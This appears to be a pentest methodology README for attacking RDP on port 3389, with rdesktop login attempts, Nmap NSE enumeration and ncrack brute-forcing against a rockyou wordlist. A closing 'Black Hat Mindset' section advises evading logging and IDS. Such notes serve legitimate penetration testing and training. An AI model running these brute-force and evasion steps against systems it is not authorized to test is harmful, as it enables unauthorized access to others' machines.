# Basic Methodology - Port 3389 (RDP)

This README provides a methodology for exploiting Remote Desktop Protocol (RDP) services running on port 3389. The focus is on connecting to RDP using rdesktop, enumerating with Nmap NSE scripts, and brute-forcing credentials with ncrack.

## Table of Contents

- [Introduction](#introduction)
- [Setup and Prerequisites](#setup-and-prerequisites)
- [Connecting to RDP](#connecting-to-rdp)
- [Enumerating with Nmap NSE Scripts](#enumerating-with-nmap-nse-scripts)
- [Brute-Forcing Credentials with ncrack](#brute-forcing-credentials-with-ncrack)
- [Black Hat Mindset](#black-hat-mindset)
- [Resources](#resources)

## Introduction

RDP, running on port 3389, is a Microsoft protocol for remote access to Windows systems. It is a common target due to weak or reused credentials and misconfigurations that allow unauthorized access. This guide covers connecting to RDP with rdesktop, enumerating vulnerabilities using Nmap NSE scripts, and brute-forcing credentials with ncrack.

## Setup and Prerequisites

To begin, ensure the following:

### Environment
- A Linux host (e.g., Kali Linux) with network access to the target RDP server.

### Tools
- Install rdesktop (e.g., `sudo apt install rdesktop` on Debian-based systems)
- Install Nmap with NSE scripts (e.g., `sudo apt install nmap`)
- Install ncrack (e.g., `sudo apt install ncrack`)

### Requirements
- Target Information: Obtain the target IP address (e.g., 192.168.1.100)
- Credential Lists: Prepare a list of usernames (e.g., administrator, user) and a password file (e.g., `/usr/share/wordlists/rockyou.txt`)

## Connecting to RDP

Use rdesktop to attempt connecting to the RDP server with known or guessed credentials.

### Command
```bash
rdesktop -u <username> -p <password> <IP address>
```

### Example
```bash
rdesktop -u administrator -p Password123 192.168.1.100
```

### Behavior
- If credentials are valid, rdesktop establishes a remote desktop session
- If credentials are incorrect, the connection fails with an error (e.g., Failed to connect)

### Notes
- The administrator account is a common target due to its high privileges
- Test credentials reused from other services (e.g., domain accounts, web apps) or default passwords
- Use `-d <domain>` for domain-based authentication if applicable (e.g., `-d CORP`)

## Enumerating with Nmap NSE Scripts

Use Nmap NSE scripts to enumerate the RDP server and identify vulnerabilities.

### List Available RDP NSE Scripts
```bash
ls -la /usr/share/nmap/scripts | grep "rdp"
```

Example Output:
```
-rw-r--r-- 1 root root  12345 Jan 10 2025 rdp-enum-encryption.nse
-rw-r--r-- 1 root root  23456 Jan 10 2025 rdp-ntlm-info.nse
-rw-r--r-- 1 root root  34567 Jan 10 2025 rdp-vuln-ms12-020.nse
```

Lists all RDP-related NSE scripts available in Nmap.

### Run Key RDP NSE Scripts

#### Gather RDP Information
```bash
nmap --script rdp-ntlm-info -p 3389 192.168.1.100
```
Retrieves NTLM information, including domain and server details.

#### Check Encryption Levels
```bash
nmap --script rdp-enum-encryption -p 3389 192.168.1.100
```
Enumerates supported encryption protocols and security settings.

#### Scan for Vulnerabilities
```bash
nmap --script rdp-vuln-ms12-020 -p 3389 192.168.1.100
```
Checks for known vulnerabilities like MS12-020 (Remote Desktop DoS).

### Notes
- Ensure Nmap is updated to include the latest NSE scripts (`nmap --script-updatedb`)
- Combine multiple scripts (e.g., `rdp-ntlm-info,rdp-enum-encryption`) for comprehensive enumeration
- Look for weak encryption or unpatched vulnerabilities that could be exploited

## Brute-Forcing Credentials with ncrack

Use ncrack to automate credential guessing for RDP.

### Command
```bash
ncrack -vv --user <username> -P <password-file> rdp://<IP address>
```

### Example
```bash
ncrack -vv --user administrator -P /usr/share/wordlists/rockyou.txt rdp://192.168.1.100
```

### Behavior
- Attempts to guess credentials using the provided username and password file
- Outputs valid credentials if successful (e.g., administrator:Password123)

### Notes
- Use `-U <username-file>` for multiple usernames (e.g., `-U users.txt`)
- Adjust `--timeout` or `--connection-limit` to avoid account lockouts or detection
- Test with a small, targeted password list initially to minimize noise

## Black Hat Mindset

To exploit RDP effectively, think like an attacker:

- **Exploit Weak Credentials**: Target reused or default credentials, especially for the administrator account
- **Enumerate Thoroughly**: Use Nmap NSE scripts to identify weak encryption, misconfigurations, or known vulnerabilities
- **Brute-Force Efficiently**: Leverage ncrack to guess credentials systematically while avoiding lockouts
- **Stay Stealthy**: Minimize connection attempts and use low-profile enumeration to evade detection by logging or IDS

## Resources

- [Microsoft RDP Documentation]()
- [Nmap NSE Documentation]()
- [ncrack Documentation]()
- [RDP Security Best Practices]()

